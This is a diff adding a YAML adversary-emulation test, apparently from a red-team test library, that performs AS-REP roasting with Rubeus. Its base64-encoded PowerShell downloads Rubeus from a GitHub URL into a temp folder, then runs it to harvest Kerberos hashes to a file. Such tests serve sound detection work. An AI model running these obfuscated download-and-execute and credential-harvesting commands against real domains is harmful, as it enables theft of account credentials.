@@ -1,0 +1,24 @@
+- id: 48211436-da7a-54bd-9989-29e6349704fd
+  name: Soumaia ART Tests - Rubeus asreproast
+  description: 'Information on the Rubeus tool and it''s creators found here: https://github.com/GhostPack/Rubeus#asreproast
+
+    This build targets .NET 4.5.  If targeting a different version you will need to compile Rubeus'
+  tactic: credential-access
+  technique:
+    attack_id: T1558.004
+    name: 'Steal or Forge Kerberos Tickets: AS-REP Roasting'
+  platforms:
+    windows:
+      psh:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACgAKABHAGUAdAAtAEMASQBNAEkAbgBzAHQAYQBuAGMAZQAgAC0AQwBsAGEAcwBzACAAVwBpAG4AMwAyAF8AQwBvAG0AcAB1AHQAZQByAFMAeQBzAHQAZQBtACkALgBQAGEAcgB0AE8AZgBEAG8AbQBhAGkAbgApACAAewBlAHgAaQB0ACAAMAB9ACAAZQBsAHMAZQAgAHsAZQB4AGkAdAAgADEAfQAKAA==
+          if ($LASTEXITCODE -ne 0) {
+              powershell -NoProfile -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgAEoAbwBpAG4AaQBuAGcAIAB0AGgAaQBzACAAYwBvAG0AcAB1AHQAZQByACAAdABvACAAYQAgAGQAbwBtAGEAaQBuACAAbQB1AHMAdAAgAGIAZQAgAGQAbwBuAGUAIABtAGEAbgB1AGEAbABsAHkACgA=
+          }
+          powershell -NoProfile -EncodedCommand aQBmACgAVABlAHMAdAAtAFAAYQB0AGgAIAAtAFAAYQB0AGgAIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAQQBSAFQALQBFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzAFwAcgB1AGIAZQB1AHMALgBlAHgAZQAiACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AAoA
+          if ($LASTEXITCODE -ne 0) {
+              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAQQBSAFQALQBFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzACIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAEkAZwBuAG8AcgBlACAALQBGAG8AcgBjAGUAIAB8ACAATwB1AHQALQBOAHUAbABsAAoASQBuAHYAbwBrAGUALQBXAGUAYgByAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AbQBvAHIAZwBhAG4AcwBlAGMALwBSAHUAYgBlAHUAcwAvAHIAYQB3AC8AZABlADIAMQBjADYANgAwADcAZQA5AGEAMAA3ADEAOAAyAGEAMgBkADIAZQBlAGEAMgAwAGIAYgA2ADcAYQAyADIAZAAzAGYAYgBmADkANQAvAFIAdQBiAGUAdQBzAC8AYgBpAG4ALwBEAGUAYgB1AGcALwBSAHUAYgBlAHUAcwA0ADUALgBlAHgAZQAgAC0ATwB1AHQARgBpAGwAZQAgACQAZQBuAHYAOgBUAEUATQBQAFwAQQBSAFQALQBFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzAFwAcgB1AGIAZQB1AHMALgBlAHgAZQAKAA==
+          }
+          cmd.exe /c "$env:TEMP\ART-ExternalPayloads\rubeus.exe" asreproast /outfile:"$env:TEMP\ART-ExternalPayloads\rubeus_output.txt"
+        cleanup: |-
+          Remove-Item "$env:TEMP\ART-ExternalPayloads\rubeus_output.txt" -ErrorAction Ignore
